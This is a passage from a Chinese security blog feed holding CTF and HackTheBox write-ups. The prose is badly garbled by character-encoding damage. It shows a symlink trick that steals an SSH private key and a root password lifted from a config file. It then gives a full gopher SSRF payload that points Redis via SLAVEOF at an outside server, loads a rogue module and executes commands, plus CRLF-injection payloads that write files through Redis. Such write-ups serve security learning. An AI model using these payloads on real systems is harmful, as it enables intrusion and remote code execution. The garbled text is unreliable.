srvadm@10.10.10.186</code></pre><p>è¿™é‡Œæˆ‘è™½ç„¶æ²¡è¯•ç¬¬äºŒç§æ€è·¯ï¼Œä½†åšå®Œé¶æœºåçœ‹åˆ°å…¶ä»–äººçš„wpé‡Œå†™åˆ°äº†è§£å†³æ–¹æ³•:</p><p>æ‰§è¡Œä¸€ä¸ªbashscript</p><pre><code>cd /var/www/jobs;while true;do        for file in $(ls .);        do                rm -rf $file;                ln -s /home/srvadm/.ssh/id_rsa $file;        donedone</code></pre><p>ç„¶åèµ·ä¸€ä¸ªncç›‘å¬ã€‚å¹¶åœ¨job.phpæäº¤å†…å®¹å†™å…¥ã€‚è¿™æ ·å°±èƒ½å¾—åˆ°ç§é’¥å¹¶ä¸”ç›´æ¥ç™»å½•äº†ã€‚</p><p>è¿™æ®µå†…å®¹å…¶å®èŠ±çš„æ—¶é—´ä¸æ¯”ç¬¬ä¸€éƒ¨åˆ†å°‘ã€‚ç”šè‡³äºæˆ‘é‡åˆ°çš„å›°éš¾æ›´å¤šã€‚æ¯”å¦‚åœ¨æ‰¾æœåŠ¡ä¸Šå¤ªå‚»äº†ã€‚ä¹‹åæƒ³èµ·è¿è¡Œpspy64sæ—¶ä¹Ÿå‘ç°äº†ç³»ç»Ÿæ˜¯æœ‰apacheæœåŠ¡è·‘ç€çš„ã€‚é‚£è‚¯å®šå°±å¾—å»æ‰¾é…ç½®æ–‡ä»¶ã€‚ç»“æœè‡ªå·±åªçœ‹äº†apacheçš„<code>apache2.conf</code>å°±äº†äº‹äº†ã€‚è¯¥æ‰“ã€‚ç„¶åå°±æ˜¯åé¢çš„æ¼æ´åˆ©ç”¨ã€‚é‚£ä¸ªchmodç€å®å®³äººï¼Œå¼€å§‹è¿˜æƒ³ç€æŠŠçŸ­é“¾æ¥é“¾åˆ°é‚£ä¸ªä¸å­˜åœ¨çš„æ–‡ä»¶ã€‚ä»”ç»†ä¸€æƒ³æ‰å‘ç°å…¶å®ç›´æ¥é“¾åˆ°keyå°±å¯äº†ã€‚</p><h2 id="privesc-to-root"><a href="#privesc-to-root" class="headerlink" title="privesc to root"></a>privesc to root</h2><p>åˆ°rootçš„éƒ¨åˆ†æ‰æ˜¯çœŸæ­£çš„<code>Quick</code>ã€‚åªéœ€è¦å¾…åœ¨è‡ªå·±çš„homeæ–‡ä»¶å¤¹è¿›è¡Œenumå³å¯ã€‚</p><p>è¿™é‡ŒæŒ‰ç…§sshkeyçš„åˆ›å»ºæ—¶é—´ï¼Œæ‰¾ä¸€ä¸‹3-21ä¹‹å‰ä¸€ä¸ªæœˆä¸åˆ°çš„æ–‡ä»¶ã€‚</p><pre><code class="bash">srvadm@quick:/home/srvadm# find . -type f -newermt &quot;2020-03-01&quot; ! -newermt &quot;2020-03-21&quot; -ls 2&gt;/dev/null   281794      4 -rw-r--r--   1 srvadm   srvadm       4038 Mar 20 06:23 ./.cache/conf.d/printers.conf   281793      8 -rw-r--r--   1 srvadm   srvadm       4569 Mar 20 06:20 ./.cache/conf.d/cupsd.conf   281799     72 -rw-rw-r--   1 srvadm   srvadm      71479 Mar 20 06:46 ./.cache/logs/debug.log   281798      4 -rw-rw-r--   1 srvadm   srvadm       1136 Mar 20 06:39 ./.cache/logs/error.log   281791     12 -rw-r--r--   1 srvadm   srvadm       9064 Mar 20 06:19 ./.cache/logs/cups.log   281425      0 -rw-r--r--   1 srvadm   srvadm          0 Mar 20 02:38 ./.cache/motd.legal-displayed   281369      4 -rw-r--r--   1 srvadm   srvadm        220 Mar 20 02:16 ./.bash_logout   281797      4 -rw-------   1 srvadm   srvadm         23 Mar 20 06:46 ./.local/share/nano/search_history   281421      4 -rw-r--r--   1 srvadm   srvadm        222 Mar 20 02:38 ./.ssh/known_hosts   281418      4 -rw-------   1 srvadm   srvadm       1679 Mar 20 02:37 ./.ssh/id_rsa   281419      4 -rw-r--r--   1 srvadm   srvadm        394 Mar 20 02:37 ./.ssh/id_rsa.pub   281370      4 -rw-r--r--   1 srvadm   srvadm       3771 Mar 20 02:16 ./.bashrc   281371      4 -rw-r--r--   1 srvadm   srvadm        807 Mar 20 02:16 ./.profile</code></pre><p>ä¸€ä¸ªä¸ªè¯»åå‘ç°å…³é”®ä¿¡æ¯åœ¨<br>./.cache/conf.d/printers.conf</p><pre><code class="bash">DeviceURI https://srvadm@quick.htb:&amp;ftQ4K3SGde8?@printerv3.quick.htb/printer</code></pre><p>ä¹‹å‰å­¦ssrfæ—¶æ€»ç»“è¿‡urlçš„å±æ€§ã€‚<code>username:password@host</code>çš„æ ¼å¼å‘Šè¯‰äº†æˆ‘ä»¬<code>&amp;ftQ4K3SGde8?</code>å¯†ç ã€‚æ‰€ä»¥ç›´æ¥å°è¯•suåˆ°rootã€‚ç›´æ¥æ‹¿åˆ°rootshell.</p><p>sshä¹Ÿæ˜¯åŒæ ·<br><img src="/2020/06/23/hackthebox-Quick-%E4%B8%80%E6%AC%A1%E8%89%B0%E9%9A%BE%E7%9A%84%E6%B8%97%E9%80%8F/11.PNG" class="lazyload" data-srcset="11.PNG" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt></p><h2 id="summary"><a href="#summary" class="headerlink" title="summary"></a>summary</h2><p>æœ¬æ¬¡æ¸—é€å‰åèŠ±äº†ä¸å°‘æ—¶é—´ã€‚ç›¸æ¯”ä¹‹å‰çœ‹ippsecè§†é¢‘åšé€€å½¹é¶æœº,ç‹¬ç«‹å®Œæˆä¸€å°å›°éš¾é¶æœºçœŸçš„æ„Ÿè§‰å¾ˆä¸é”™ï¼Œä¹Ÿå¾ˆè‰°è¾›ã€‚å½“ç„¶ï¼Œèƒ½å®Œæ•´åšå®Œå¾ˆå¤§ç¨‹åº¦ä¸Šæ˜¯å› ä¸ºè¿™å°é¶æœºçš„å†…å®¹å¾ˆé€‚åˆCTFçš„webé€‰æ‰‹ã€‚è‡ªå·±åœ¨å¾ˆå¤šåœ°æ–¹ä¹Ÿéƒ½è¿ç”¨åˆ°äº†è‡ªå·±æ—¥å¸¸æ¯”èµ›æ—¶çš„å°æŠ€èƒ½ã€‚åŒæ—¶é¶æœºå…³äºhttp/3,xslt-&gt;RCE,ææƒæ–¹æ³•ç­‰ç­‰éƒ½æœ‰å¾ˆå¤§æ”¶è·ã€‚æ‰€ä»¥éå¸¸èµã€‚</p><p>å…¶å®å‰å‰åååšäº†å¿«20å¤šå°HTBé¶æœº,æ„Ÿè§‰è‡ªå·±ç»å¸¸å¡åœ¨<code>enumeration</code>ä¹Ÿå°±æ˜¯æšä¸¾(ä¿¡æ¯æ”¶é›†)ä¸Šã€‚è€Œè¿™å¾€å¾€æ˜¯è§£å†³é—®é¢˜çš„å…³é”®ã€‚å¸Œæœ›èƒ½å¤Ÿå¤šé”»ç‚¼ä¸‹è‡ªå·±è¿™æ–¹é¢çš„èƒ½åŠ›å§ã€‚</p>]]></content>
      
      
      
        <tags>
            
            <tag> WEB </tag>
            
            <tag> PHP </tag>
            
            <tag> hackthebox </tag>
            
            <tag> pentest </tag>
            
            <tag> Linux </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>åˆæ¢Redis-wdbç„æ­¦ç»„ssrfme&amp;pwnhubå…¬å¼€èµ›</title>
      <link href="2020/05/30/%E5%88%9D%E6%8E%A2Redis-wdb%E7%8E%84%E6%AD%A6%E7%BB%84ssrfme&amp;pwnhub%E5%85%AC%E5%BC%80%E8%B5%9B/"/>
      <url>2020/05/30/%E5%88%9D%E6%8E%A2Redis-wdb%E7%8E%84%E6%AD%A6%E7%BB%84ssrfme&amp;pwnhub%E5%85%AC%E5%BC%80%E8%B5%9B/</url>
      
        <content type="html"><![CDATA[<ul><li>æœ¬å­¦æœŸæœ€åä¸€ç¯‡æ–‡ç« ã€‚å†™å®Œå°±è¦å¤ä¹ å»äº†ã€‚</li></ul><p>æ–‡ç« å†™åœ¨RCTFç¬¬ä¸€å¤©ã€‚webç‹—çœŸå®è‡ªé—­.æœ¬æ¥æƒ³æŠŠå‡æœŸå‰æœ€åä¸€ç¯‡æ–‡ç« ç•™ç»™RCTFwpçš„ã€‚ç°åœ¨çœ‹éƒ½ä¸ç”¨å†™äº†,åæ­£åªä¼šä¸€é“ã€‚åŸå…ˆå¬è¯´è¿‡ROISçš„webå¾ˆå¼ºï¼Œzsxå¤§å¸ˆå‚…æ˜¯å·¨ä½¬ï¼Œæ²¡æƒ³åˆ°ææ€–å¦‚æ–¯ã€‚(è¿™å°±æ˜¯ROISè·Ÿzsxçš„å¯æ€•ä¹‹å¤„å—,æ€•äº†æ€•äº†)</p><p>æ‰€ä»¥æ¯”èµ›ç¬¬ä¸€å¤©ç•™æ„åˆ°æœ‰ä¸ªpwnhubå…¬å¼€èµ›ï¼Œäºæ˜¯å°±å»æ°´äº†ä¸‹ï¼Œå¥½æ­¹æ˜¯æ‹¿äº†ä¸ªé‚€è¯·ç ã€‚è¿™é¢˜å› ä¸ºæ˜¯redisç›¸å…³ï¼Œè”æƒ³åˆ°ä¹‹å‰ç½‘é¼æ¯ç„æ­¦çš„é‚£é“redisï¼ŒåŠ ä¸Šè‡ªå·±åŸæ¥åŸºæœ¬æ²¡åšè¿‡redisé¢˜ï¼Œæ‰“ç®—æŠŠè¿™ä¸¤é“é¢˜ç›¸å…³çŸ¥è¯†ç‚¹éƒ½æ€»ç»“ä¸‹ï¼Œå½“åšè¿™å­¦æœŸçš„æ”¶å°¾å§ã€‚</p><a id="more"></a><h2 id="ç½‘é¼æ¯ç„æ­¦ç»„ssrfme"><a href="#ç½‘é¼æ¯ç„æ­¦ç»„ssrfme" class="headerlink" title="ç½‘é¼æ¯ç„æ­¦ç»„ssrfme"></a>ç½‘é¼æ¯ç„æ­¦ç»„ssrfme</h2><p>è¿™é¢˜çœŸæ²¡æƒ³åˆ°ï¼Œæ˜¯éƒå¸ˆå‚…å‡ºçš„é¢˜â€¦â€¦ç½‘ä¸Šå¤§éƒ¨åˆ†åšæ³•éƒ½æ˜¯ä¸»ä»å¤åˆ¶RCEåšçš„ï¼Œä¸è¿‡éƒå¸ˆå‚…è¯´è¯•è¯•ä¸ç”¨ä¸»ä»å¤åˆ¶åš,ä¸çŸ¥é“æ˜¯ä»€ä¹ˆå§¿åŠ¿ã€‚</p><pre><code class="php">&lt;?php function check_inner_ip($url) {     $match_result=preg_match(&#39;/^(http|https|gopher|dict)?:\/\/.*(\/)?.*$/&#39;,$url);     if (!$match_result)     {         die(&#39;url fomat error&#39;);     }     try     {         $url_parse=parse_url($url);     }     catch(Exception $e)     {         die(&#39;url fomat error&#39;);         return false;     }     $hostname=$url_parse[&#39;host&#39;];     $ip=gethostbyname($hostname);     $int_ip=ip2long($ip);     return ip2long(&#39;127.0.0.0&#39;)&gt;&gt;24 == $int_ip&gt;&gt;24 || ip2long(&#39;10.0.0.0&#39;)&gt;&gt;24 == $int_ip&gt;&gt;24 || ip2long(&#39;172.16.0.0&#39;)&gt;&gt;20 == $int_ip&gt;&gt;20 || ip2long(&#39;192.168.0.0&#39;)&gt;&gt;16 == $int_ip&gt;&gt;16; } function safe_request_url($url) {     if (check_inner_ip($url))     {         echo $url.&#39; is inner ip&#39;;     }     else     {        $ch = curl_init();         curl_setopt($ch, CURLOPT_URL, $url);         curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);         curl_setopt($ch, CURLOPT_HEADER, 0);         $output = curl_exec($ch);         $result_info = curl_getinfo($ch);         if ($result_info[&#39;redirect_url&#39;])         {             safe_request_url($result_info[&#39;redirect_url&#39;]);         }         curl_close($ch);         var_dump($output);     } } if(isset($_GET[&#39;url&#39;])){    $url = $_GET[&#39;url&#39;];     if(!empty($url)){         safe_request_url($url);     } }else{    highlight_file(__FILE__);}// Please visit hint.php locally. ?&gt;</code></pre><p>é¦–å…ˆæ‹¿åˆ°é¢˜ç›®æ˜¯ç»å…¸çš„yuligeæ ‡é…ssrfã€‚å¯ä»¥çœ‹åˆ°,æˆ‘ä»¬å…è®¸ä½¿ç”¨çš„schemeæ˜¯http,gopherä»¥åŠdictã€‚ç„¶åéœ€è¦ç»•è¿‡ä¸€ä¸ªå†…ç½‘ipæ£€æµ‹ï¼Œå³å¯è¿›è¡Œcurlçš„ssrf.</p><p>çœ‹åˆ°æç¤ºè¯´è®¿é—®hint.phpã€‚çœ‹æ¥éœ€è¦ç»•è¿‡ipé™åˆ¶è¿›è¡Œå†…ç½‘è®¿é—®ã€‚è¿™ä¸ªç‚¹ä¹‹å‰æ€»ç»“ssrfæ—¶æåˆ°è¿‡,ç®—æ˜¯åŸºæœ¬trickäº†</p><pre><code>url=http://bycsec.top@0.0.0.0/hint.php</code></pre><p><code>0.0.0.0</code>é»˜è®¤æœ¬åœ°ã€‚<code>@</code>åˆ™æ˜¯å› ä¸ºphpparse_urlåªä¼šåŒ¹é…åˆ°æœ€åä¸€ä¸ª<code>@</code>åçš„å†…å®¹çš„åŸå› ã€‚è¿™æ ·æˆ‘ä»¬å°±å¯ä»¥ç»•è¿‡äº†ã€‚<br><img src="/2020/05/30/%E5%88%9D%E6%8E%A2Redis-wdb%E7%8E%84%E6%AD%A6%E7%BB%84ssrfme&pwnhub%E5%85%AC%E5%BC%80%E8%B5%9B/0.PNG" class="lazyload" data-srcset="0.PNG" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt></p><p>å¾—åˆ°ä¸€ä¸ªrediså¯†ç ã€‚ä¸‹é¢æ˜¯è¯•å›¾å¾—åˆ°webshell</p><p>é€šå¸¸æ¥è¯´ssrf+redis getshellä¸»è¦æ˜¯è¿™å‡ ç§å§¿åŠ¿</p><ol><li>å¯å†™webshellã€‚</li><li>å†™sshå…¬é’¥</li><li>å†™crontabåå¼¹shell(ä»…é™centos)</li><li>ä¸»ä»å¤åˆ¶RCE</li></ol><p>è¿™é‡Œæœ€ç®€å•çš„æ˜¯å¯å†™webshellçš„æƒ…å†µã€‚å…·ä½“ä¸Šå°±è·Ÿä¹‹å‰GKCTFé‚£é¢˜ä¸€æ ·ï¼Œpayloadç¼–ç å¥½å°±èƒ½ç”¨gopheræ‰“ã€‚</p><p>æ­¤å¤„è™½ç„¶æ˜¯php,ä½†æ˜¯å¹¶ä¸èƒ½å†™webshellã€‚å‰©ä¸‹çš„å½“ç„¶æ˜¯æ›´ä¸å¯èƒ½çš„ã€‚å› ä¸ºæ²¡æœ‰sshè·ŸcrontabæœåŠ¡ã€‚é‚£ä¹ˆå€¼å¾—ä¸€è¯•çš„å°±æ˜¯ä¸»ä»å¤åˆ¶RCEäº†</p><p>è¯¦ç»†çŸ¥è¯†å¯ä»¥å»çœ‹éƒå¸ˆå‚…åœ¨xrayç¤¾åŒºå‘çš„rediså®‰å…¨å­¦ä¹ å°è®°ã€‚</p><p>ä¸»ä»å¤åˆ¶ï¼Œä¸»è¦åˆ©ç”¨çš„å°±æ˜¯redis<code>SLAVE OF</code>çš„å‘½ä»¤ï¼Œå°†ä¸€å°redisçš„æ•°æ®å¤åˆ¶åˆ°å¦ä¸€å°ã€‚å‰è€…ä¸ºä¸»èŠ‚ç‚¹ï¼Œåè€…ä¸ºä»èŠ‚ç‚¹ã€‚è¿™ä¸ªå¤åˆ¶è¿‡ç¨‹æ˜¯å•å‘çš„ã€‚</p><p>è€Œæˆ‘ä»¬redisä¸»ä»å¤åˆ¶RCEçš„æ–¹å¼ï¼Œå…¶å®å°±æ˜¯åˆ©ç”¨äº†redisç®€æ´çš„åè®®ï¼Œæ„é€ æ¶æ„æœåŠ¡å™¨ï¼Œå°†åŸæœ¬ç”¨äºå­˜å‚¨å¤‡ä»½çš„rdbæ–‡ä»¶,æ›¿æ¢ä¸ºæˆ‘ä»¬æ¶æ„çš„exp.soã€‚è¿™æ ·èŠ‚ç‚¹redisä¸­å°±ä¼šè‡ªåŠ¨ç”Ÿæˆexp.soï¼Œä½¿å¾—æˆ‘ä»¬å¯ä»¥ç”¨load_moduleè¿›è¡Œrce.</p><p>éœ€è¦æ³¨æ„çš„æ˜¯,å› ä¸ºåˆ©ç”¨rediså†™æ–‡ä»¶çš„æ–¹å¼å†™å…¥exp.soä¼šå› ä¸ºredisçš„å¤§é‡æ— ç”¨æ•°æ®paddingå½±å“å…¶æ­£å¸¸ä½¿ç”¨ã€‚è€Œæˆ‘ä»¬åˆ©ç”¨ä¸»ä»å¤åˆ¶ä¸Šä¼ soï¼Œä¸»è¦ç”¨åˆ°çš„æ˜¯webåº”ç”¨å±‚é¢çš„ä¸Šä¼ ã€‚è€Œphpé»˜è®¤çš„www-dataæ˜¯644,æ‹¥æœ‰åªè¯»æƒé™ã€‚å®æˆ˜ä¸­æ˜¯å®Œå…¨å¯ä»¥ç»“åˆä¸Šä¼ æ”»å‡»çš„ã€‚</p><p>å› æ­¤æœ¬é¢˜åªè¦ç”¨åˆ°ä¸¤ä¸ªä¸¤ä¸ªå·¥å…·å³å¯<br><a href="https://github.com/xmsec/redis-ssrf" target="_blank" rel="noopener">https://github.com/xmsec/redis-ssrf</a><br><a href="https://github.com/n0b0dyCN/redis-rogue-server" target="_blank" rel="noopener">https://github.com/n0b0dyCN/redis-rogue-server</a></p><p>å‰è€…ç”¨äºç”Ÿæˆpayloadï¼ŒåŒæ—¶ä¹Ÿå¯å¯åŠ¨æ¶æ„serverã€‚åè€…ä¸»è¦æ˜¯exp.soã€‚å»ºè®®æŠŠexp.soç›´æ¥æ‹·åˆ°å‰é¢æ–‡ä»¶å¤¹ä¸‹å°±è¡Œäº†ã€‚</p><p>ç„¶åæˆ‘ä»¬è®¾ç½®å¯¹åº”çš„payloadã€‚ä¿®æ”¹<code>ssrf-redis.py</code>åœ¨é»˜è®¤çš„rceæ¨¡å¼ä¸‹,åªè¦æ”¹å‘½ä»¤ï¼Œlhost,lport,å¯†ç å³å¯ã€‚ç„¶åå¯åŠ¨æ¶æ„æœåŠ¡å™¨ã€‚ç”¨å‰é¢ç”Ÿæˆå¥½çš„payloadç›´æ¥æ‰“ã€‚<br><code>url=gopher%3a%2f%2fwww.bycsec.top%400.0.0.0%3a6379%2f_%252A2%250D%250A%25244%250D%250AAUTH%250D%250A%252430%250D%250Awelcometowangdingbeissrfme6379%250D%250A%252A3%250D%250A%25247%250D%250ASLAVEOF%250D%250A%252414%250D%250A120.27.246.202%250D%250A%25244%250D%250A6666%250D%250A%252A4%250D%250A%25246%250D%250ACONFIG%250D%250A%25243%250D%250ASET%250D%250A%25243%250D%250Adir%250D%250A%25245%250D%250A%2ftmp%2f%250D%250A%252A4%250D%250A%25246%250D%250Aconfig%250D%250A%25243%250D%250Aset%250D%250A%252410%250D%250Adbfilename%250D%250A%25246%250D%250Aexp.so%250D%250A%252A3%250D%250A%25246%250D%250AMODULE%250D%250A%25244%250D%250ALOAD%250D%250A%252411%250D%250A%2ftmp%2fexp.so%250D%250A%252A2%250D%250A%252411%250D%250Asystem.exec%250D%250A%252413%250D%250Acat%2524%257BIFS%257D%2ffl%252A%250D%250A%252A1%250D%250A%25244%250D%250Aquit%250D%250A</code><br>ç¬¬ä¸€æ¬¡æ‰“ä¼šå»ºç«‹å¥½ä¸»ä»å¤åˆ¶ã€‚è¿™æ—¶å€™å°±å¯ä»¥å…³æ‰serverç›´æ¥ç”¨ssrfå‘½ä»¤è¿›è¡ŒRCEäº†ã€‚</p><p><img src="/2020/05/30/%E5%88%9D%E6%8E%A2Redis-wdb%E7%8E%84%E6%AD%A6%E7%BB%84ssrfme&pwnhub%E5%85%AC%E5%BC%80%E8%B5%9B/1.PNG" class="lazyload" data-srcset="1.PNG" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt></p><h2 id="pwnhubå…¬å¼€èµ›-ä¸ƒçˆªé±¼-flagåœ¨çº¿çˆ¬å–ç³»ç»Ÿ"><a href="#pwnhubå…¬å¼€èµ›-ä¸ƒçˆªé±¼-flagåœ¨çº¿çˆ¬å–ç³»ç»Ÿ" class="headerlink" title="pwnhubå…¬å¼€èµ›-ä¸ƒçˆªé±¼ flagåœ¨çº¿çˆ¬å–ç³»ç»Ÿ"></a>pwnhubå…¬å¼€èµ›-ä¸ƒçˆªé±¼ flagåœ¨çº¿çˆ¬å–ç³»ç»Ÿ</h2><p>è¿™æ¬¡åšé¢˜æœ¬æ¥æ˜¯å› ä¸ºè¢«RCTFè™æƒ¨äº†è·‘å»çœ‹çœ‹çš„ã€‚ç»“æœéš¾åº¦ä¼¼ä¹é€‚ä¸­ã€‚åˆšå¥½ç»™æˆ‘ä¸€ç‚¹ç‚¹æ»¡è¶³æ„Ÿã€‚</p><p>é¦–å…ˆé¢˜ç›®serveræ˜¯gunicornçš„é…ç½®ã€‚è¿™ä¸ªä»headerä¸­å¯ä»¥çœ‹å‡ºæ¥ã€‚ç„¶åæ³¨å†Œç™»å½•åå‘ç°æœ‰ä¸€ä¸ªçˆ¬è™«<code>/spider</code>è·¯ç”±ã€‚æ‹¿<code>file:///etc/passwd</code>æ‰“ä¸€å‘å¯ä»¥è¯»åˆ°/etc/passwd.çœ‹æ¥åˆæ˜¯ä¸ªssrfã€‚<br><img src="/2020/05/30/%E5%88%9D%E6%8E%A2Redis-wdb%E7%8E%84%E6%AD%A6%E7%BB%84ssrfme&pwnhub%E5%85%AC%E5%BC%80%E8%B5%9B/2.PNG" class="lazyload" data-srcset="2.PNG" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt><br>åŒæ—¶æ³¨æ„åˆ°ç”¨æˆ·é‡Œæœ‰redis-dbè·Ÿserver.çœ‹æ¥æ˜¯æœ‰redisäº†ã€‚</p><p>ç®€å•æ¢æµ‹ä¸‹å‘ç°6379ç«¯å£æœ‰redisçš„æŠ¥é”™å›æ˜¾ã€‚</p><p>ç¬¬ä¸€ååº”å…ˆè¯»äº†ä¸‹bash_historyã€‚å‘ç°ä¸€ä¸ªæ²¡æƒé™ä¸€ä¸ªä¸å­˜åœ¨ã€‚(å‡å¦‚èƒ½ç”¨è¿™ç§æ–¹å¼çŸ¥é“æ ¹ç›®å½•flagçš„åç§°é‚£å°±ä¼šç®€ä¾¿å¾ˆå¤šï¼Œè¿™ä¹Ÿæ˜¯æˆ‘åœ¨wustctfå½“æ—¶ç›´æ¥è¯»åˆ°flagçš„éé¢„æœŸæ€è·¯)</p><p>ç„¶åæœŸé—´è§¦å‘äº†æŠ¥é”™ã€‚å‘ç°æ˜¯pythonçš„urllibåº“è°ƒç”¨çš„urlopenã€‚è¿™ä¸ªåº“ç†Ÿæ‚‰çš„è¯åº”è¯¥éƒ½çŸ¥é“æ˜¯å­˜åœ¨CRLFçš„æ´çš„ã€‚æˆ‘ä»¬å¯ä»¥ç”¨è¿™ä¸ªssrfå¾€è‡ªå·±æœåŠ¡å™¨æ‰“ä¸€æ³¢ã€‚ncç›‘å¬çš„è¯ä¼šå‘ç°æ˜¯python3.5çš„urllibã€‚</p><p>å¯¹urllibçš„ssrf,ç”¨httpåè®®ä¸‹çš„å¯ä»¥ç›´æ¥æ‰“</p><pre><code>http://127.0.0.1:6379?%0d%0aKEYS%20*%0d%0apaddingåªè¿”å›$-1http://127.0.0.1:6379?%0d%0aconfig%20set%20dir%20/tmp%0d%0aconfig%20set%20dbfilename%20byc%0d%0asave%0d%0apaddingfile:///tmp/bycæˆåŠŸå†™å…¥æ–‡ä»¶</code></pre><p>é‚£ä¹ˆæ­¤æ—¶å¤§è‡´ç¡®è®¤å¯ä»¥ç”¨è¿™ä¸ªssrfæ‰“redisäº†ã€‚ä½†æ˜¯è¦æ³¨æ„çš„æ˜¯æˆ‘ä»¬pythonæœåŠ¡å™¨ä¸èƒ½ç›´æ¥å†™webshellã€‚ä¸èƒ½å†™å®šæ—¶å’Œkeyã€‚è€Œä¸”ç”±äºgopherä¸æ”¯æŒä¹Ÿä¸èƒ½è¿›è¡ŒRCEã€‚æ¢è¨€ä¹‹æˆ‘ä»¬åªèƒ½å¯¹redisè¿›è¡Œå‘½ä»¤æ“ä½œã€‚æ‰€ä»¥æˆ‘æƒ³å…ˆå°è¯•æ¢æµ‹æºç ä¿¡æ¯</p><p>é¦–å…ˆæ˜¯<code>/proc/self/cmdline</code>ã€‚è¯»åˆ°äº†gunicornçš„ç›¸å…³é…ç½®ã€‚</p><p><code>/usr/local/python3/bin/python3.5/usr/local/python3/bin/gunicorn--config=config.pyrun:app</code></p><p>å¾—åˆ°run.pyã€‚è¿™é‡Œç›´æ¥ç”¨<code>/proc/self/cwd/run.py</code>å»è¯»å·¥ä½œç›®å½•ä¸‹çš„æºç </p><pre><code class="python"># -*- coding: utf-8 -*-import picklefrom sipder import Spiderfrom redis import StrictRedisfrom flask import Flask, render_template, redirect, session, request, make_response, url_for, abort, render_template_stringfrom user import *app = Flask(__name__)redis = StrictRedis(host=&#39;127.0.0.1&#39;,port=6379,db=0)@app.route(&#39;/&#39;)def index():    cookie = request.cookies.get(&quot;Cookie&quot;)    return redirect(url_for(&quot;login&quot;))@app.route(&#39;/login/&#39;,methods=[&#39;GET&#39;,&#39;POST&#39;])def login():    if request.method != &#39;GET&#39;:        username = request.form.get(&#39;username&#39;)        password = request.form.get(&#39;password&#39;)        cookie = Cookie()        cookie.create = username        cookie = cookie.create        try:            if redis.exists(cookie):                user = pickle.loads(redis.get(cookie))                if user.verify_pass(password):                    resp = make_response(redirect(url_for(&#39;home&#39;)))                    resp.set_cookie(&#39;Cookie&#39;,cookie)                    return resp        except:            abort(500)    return render_template(&quot;login.html&quot;)@app.route(&#39;/register/&#39;,methods=[&#39;GET&#39;,&#39;POST&#39;])def register():    if request.method != &#39;GET&#39;:        email = request.form.get(&#39;email&#39;)        username = request.form.get(&#39;username&#39;)        password = request.form.get(&#39;password&#39;)        user = User(email,username,password)        cookie = Cookie()        cookie.create = username        cookie = cookie.create        try:            if not redis.exists(cookie):                redis.set(cookie,pickle.dumps(user))                resp = make_response(redirect(url_for(&#39;home&#39;)))                resp.set_cookie(&quot;Cookie&quot;,cookie)                return resp        except:            abort(500)    return render_template(&quot;register.html&quot;)@app.route(&#39;/home/&#39;,methods=[&#39;GET&#39;,&#39;POST&#39;])def home():    cookie = request.cookies.get(&#39;Cookie&#39;)    try:        if Cookie.verify(cookie) and redis.exists(cookie):            user = redis.get(cookie)            user = pickle.loads(user)            if request.method != &quot;GET&quot;:                formlist = request.form.to_dict()                User.modify_info(user,formlist)                redis.set(cookie,pickle.dumps(user))                return render_template(&quot;home.html&quot;,user=user)            return render_template(&quot;home.html&quot;,user=user)    except:        return abort(500)    return redirect(url_for(&quot;login&quot;))@app.route(&#39;/spider/&#39;,methods=[&#39;GET&#39;,&#39;POST&#39;])def spider():    cookie = request.cookies.get(&#39;Cookie&#39;)    try:        if Cookie.verify(cookie) and redis.exists(cookie):            user = redis.get(cookie)            user = pickle.loads(user)    except:        return abort(500)    result=&#39;&#39;    if request.method == &quot;GET&quot;:        result=&#39;&#39;    elif request.method != &quot;GET&quot; and request.form.get(&#39;url&#39;)!=None:        try:            target_url = request.form.get(&#39;url&#39;)            new_spider = Spider(target_url)            result = new_spider.spiderFlag()        except Excetion as e:            result = e    return render_template(&quot;spider.html&quot;,result=str(result),user=user)@app.route(&#39;/testSpider/&#39;)def TSpider():    html = &#39;&lt;div id=&quot;flag&quot;&gt;Flag{hahaha This is a test for tested Spider mode}&lt;/div&gt;&#39;    return render_template_string(html)@app.route(&#39;/logout/&#39;)def logout():    resp = make_response(redirect(url_for(&#39;login&#39;)))    resp.set_cookie(&#39;Cookie&#39;,&#39;&#39;)    return resp@app.errorhandler(500)def error(e):    return render_template(&quot;error.html&quot;)if __name__ == &quot;__main__&quot;:    app.run(        debug=True,        port=5000,        host=&quot;0.0.0.0&quot;    )</code></pre><p>ä»è°ƒç”¨çš„åŒ…çœ‹åˆ°è¿˜æœ‰ä¸¤ä¸ªè‡ªå®šä¹‰çš„åŒ…ã€‚ä¹Ÿä¸€å¹¶è¯»ä¸‹æ¥ã€<br>sipder.py</p><pre><code class="python">import urllibimport urllib.requestfrom bs4 import BeautifulSoupclass Spider:    def __init__(self, url):        self.target_url = url    def __getResponse(self):        try:            info = urllib.request.urlopen(self.target_url).read().decode(&quot;utf-8&quot;)            return (info, True)        except Exception as err:            return (err, False)    def spiderFlag(self):        infos = self.__getResponse()        if infos[1]:            soup = BeautifulSoup(infos[0])            flag = soup.find(id==&#39;flag&#39;)            return infos[0]            return flag.text        return infos[0]</code></pre><p>user.py</p><pre><code class="python">-*- 